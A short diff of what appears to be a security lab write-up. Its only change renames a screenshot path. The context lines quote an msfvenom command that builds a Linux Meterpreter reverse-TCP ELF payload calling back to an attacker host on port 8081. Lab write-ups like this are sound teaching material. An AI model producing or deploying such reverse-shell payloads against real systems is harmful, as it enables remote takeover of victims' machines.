@@ -40,7 +40,7 @@ On Kali Linux terminal, switched to root privileges, and generated a Linux Meter
 
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=8081 -f elf > test.elf
 
-  ![Payload Creation](Lab2-screenshots/Payload-Create.png)
+  ![Payload Creation](Lab2-screenshots/payload-creation.png)
 
 Explanation
 
